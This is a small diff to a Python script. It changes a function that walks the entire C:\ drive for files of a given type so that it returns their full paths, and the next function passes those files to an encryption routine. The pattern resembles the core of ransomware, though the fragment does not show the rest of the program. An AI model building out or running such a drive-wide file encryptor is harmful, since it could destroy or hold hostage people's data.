@@ -19,7 +19,9 @@ def find_files(file_type):
     for parent, _, filenames in os.walk('C:\\'): 
         for filename in filenames:
             if filename.endswith(file_type):
-                yield filename
+                full_path = os.path.join(parent, filename)
+                print(f"Found file: {full_path}")
+                yield full_path
 
 def encrypt(filename, key):
     k = generate_key(password)
